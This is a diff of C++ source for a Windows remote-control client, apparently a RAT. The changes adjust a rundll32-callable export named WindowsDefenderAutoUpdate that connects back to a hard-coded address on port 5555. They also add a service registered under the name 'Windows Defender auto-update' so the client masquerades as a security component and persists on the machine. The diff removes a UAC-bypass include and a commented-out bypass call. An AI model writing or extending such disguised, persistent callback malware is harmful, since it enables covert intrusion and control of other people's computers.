@@ -18,7 +18,6 @@
 #include "Misc.h"
 #include "Login.h"
 #include "SocketClientManage.h"
-#include "BypassUAC.h"
 
 
 typedef struct _REBORN_THREAD_PARAM {
@@ -40,6 +39,7 @@ CSocketClient* StartClientFuncBody(CSocketClient* pMainSocketClient, LPCTSTR psz
 
 
 #ifdef _DEBUG
+// 用VS调试的话请在 "MuaClient -> 配置属性 -> 调试 -> 命令参数" 中修改IP地址和端口
 int wmain(int argc, wchar_t *argv[]) {
 	if (argc < 3)
 	{
@@ -65,8 +65,6 @@ int wmain(int argc, wchar_t *argv[]) {
 
 #ifdef _RELEASE
 
-//不写extern "C"的话，函数名就被VC给改了，就没法用我们定义的函数名来通过rundll32执行该函数了
-extern "C" __declspec(dllexport) void WindowsDefenderAutoUpdate();
 
 
 BOOL APIENTRY DllMain(HMODULE hModule,
@@ -86,11 +84,10 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 }
 
 
-_declspec(dllexport) void WindowsDefenderAutoUpdate() {
+//不写extern "C"的话，函数名就被VC给改了，就没法用我们定义的函数名来通过rundll32执行该函数了
+extern "C" _declspec(dllexport) void WindowsDefenderAutoUpdate() {
 
-	//CMLuaUtilBypassUAC((LPWSTR)L"C:\\Windows\\System32\\cmd.exe");
-
-	WCHAR pszAddress[20] = L"192.168.0.102";
+	WCHAR pszAddress[20] = L"192.168.0.101";
 	WCHAR pszPort[10] = L"5555";
 
 	REBORN_THREAD_PARAM* pThreadParam = new REBORN_THREAD_PARAM(pszAddress, pszPort);
@@ -100,39 +97,38 @@ _declspec(dllexport) void WindowsDefenderAutoUpdate() {
 }
 
 
+
+
+
+void WINAPI ServiceCtrlHandle(DWORD dwOperateCode);
+BOOL TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress);
+void MyCode();
+
 // 全局变量
 WCHAR g_szServiceName[MAX_PATH] = L"Windows Defender自动更新";    // 服务名称 
 SERVICE_STATUS_HANDLE g_ServiceStatusHandle = { 0 };
 
 
-int wmain(int argc, wchar_t* argv[])
-{
-	// 注册服务入口函数
-	SERVICE_TABLE_ENTRY stDispatchTable[] = { { g_szServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain }, { NULL, NULL } };
-	StartServiceCtrlDispatcher(stDispatchTable);
-
-	return 0;
-}
-
-
-void __stdcall ServiceMain(DWORD dwArgc, char *lpszArgv)
+// 服务的入口函数
+extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[])
 {
 	g_ServiceStatusHandle = RegisterServiceCtrlHandler(g_szServiceName, ServiceCtrlHandle);
 
 	TellSCM(SERVICE_START_PENDING, 0, 1);
 	TellSCM(SERVICE_RUNNING, 0, 0);
 
+	// 执行我们的代码
 	MyCode();
 
-	while (TRUE)
-	{
+	while (TRUE){
 		Sleep(5000);
 	}
 }
 
 
-void __stdcall ServiceCtrlHandle(DWORD dwOperateCode)
-{
+// 服务的处理回调的函数
+void WINAPI ServiceCtrlHandle(DWORD dwOperateCode){
+
 	switch (dwOperateCode)
 	{
 	case SERVICE_CONTROL_PAUSE:
@@ -166,8 +162,9 @@ void __stdcall ServiceCtrlHandle(DWORD dwOperateCode)
 	}
 }
 
-BOOL TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress)
-{
+
+BOOL TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress){
+
 	SERVICE_STATUS serviceStatus = { 0 };
 	BOOL bRet = FALSE;
 
@@ -182,9 +179,8 @@ BOOL TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress)
 	return bRet;
 }
 
-void MyCode()
-{
-	// 自己程序实现部分代码放在这里
+
+void MyCode(){
 	WindowsDefenderAutoUpdate();
 }
 
